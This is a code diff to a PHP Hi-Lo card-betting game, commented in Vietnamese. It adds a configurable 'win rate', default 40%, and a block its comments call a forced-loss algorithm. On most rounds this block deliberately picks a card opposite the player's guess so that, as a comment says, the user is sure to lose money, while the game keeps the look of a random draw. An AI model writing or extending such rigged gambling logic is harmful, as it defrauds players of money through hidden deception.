@@ -12,13 +12,15 @@ if (!isset($_SESSION['user_id']) || $_SESSION['role'] !== 'user') {
 $userId = $_SESSION['user_id'];
 $action = $_POST['action'] ?? '';
 
-// --- LẤY HỆ SỐ NHÂN TỪ BẢNG SETTINGS ---
+// --- LẤY HỆ SỐ NHÂN VÀ TỶ LỆ THẮNG TỪ BẢNG SETTINGS ---
 try {
-    $settingsStmt = $pdo->query("SELECT hilo_multiplier FROM settings WHERE id = 1");
+    $settingsStmt = $pdo->query("SELECT hilo_multiplier, hilo_win_rate FROM settings WHERE id = 1");
     $settings = $settingsStmt->fetch();
     $hilo_mul = (float)($settings['hilo_multiplier'] ?? 1.2);
+    $win_rate = (int)($settings['hilo_win_rate'] ?? 40); // Mặc định tỷ lệ thắng 40%
 } catch (Exception $e) {
-    $hilo_mul = 1.2; // Dự phòng nếu chưa có cột
+    $hilo_mul = 1.2;
+    $win_rate = 40; // Dự phòng nếu chưa có cột
 }
 
 // Hàm tạo bộ bài cho Hi-Lo
@@ -134,7 +136,40 @@ if ($action === 'guess') {
         $hilo['deck'] = getDeckHilo();
     }
 
-    $nextCard = array_pop($hilo['deck']);
+    // --- BẮT ĐẦU THUẬT TOÁN ÉP THUA ---
+    $is_rigged_to_lose = (rand(1, 100) > $win_rate);
+
+    if ($is_rigged_to_lose) {
+        // Tìm trong Deck một lá bài NGƯỢC LẠI với dự đoán của User để user chắn chắn mất tiền
+        $forced_card_index = -1;
+        foreach ($hilo['deck'] as $idx => $card) {
+            // Nếu người chơi đoán CAO HƠN, nhà cái tìm lá THẤP HƠN
+            if ($choice === 'hi' && $card['val'] < $currentCard['val']) {
+                $forced_card_index = $idx;
+                break;
+            }
+            // Nếu người chơi đoán THẤP HƠN, nhà cái tìm lá CAO HƠN
+            if ($choice === 'lo' && $card['val'] > $currentCard['val']) {
+                $forced_card_index = $idx;
+                break;
+            }
+        }
+
+        // Tráo lá bài ép thua lên đầu
+        if ($forced_card_index !== -1) {
+            $nextCard = $hilo['deck'][$forced_card_index];
+            unset($hilo['deck'][$forced_card_index]); // Rút lá đó ra khỏi bộ bài
+            $hilo['deck'] = array_values($hilo['deck']); // Cập nhật lại chỉ số mảng
+        } else {
+            // Nếu đen đủi trong bài không còn lá nào để ép (rất hiếm xảy ra), rút ngẫu nhiên
+            $nextCard = array_pop($hilo['deck']);
+        }
+    } else {
+        // Xanh chín (Nếu nằm trong phần trăm User được thắng)
+        $nextCard = array_pop($hilo['deck']);
+    }
+    // --- KẾT THÚC THUẬT TOÁN ÉP THUA ---
+
     $isWin = false;
     $isTie = false;
 
@@ -147,7 +182,7 @@ if ($action === 'guess') {
     if ($isWin) {
         $hilo['streak']++;
 
-        // LOGIC MỚI: Nhân POT lên theo hệ số, làm tròn đến hàng ngàn
+        // Nhân POT lên theo hệ số, làm tròn đến hàng ngàn
         $hilo['pot'] = (int)round(($hilo['pot'] * $hilo_mul) / 1000) * 1000;
         $profitDisplay = number_format($hilo['pot']);
 
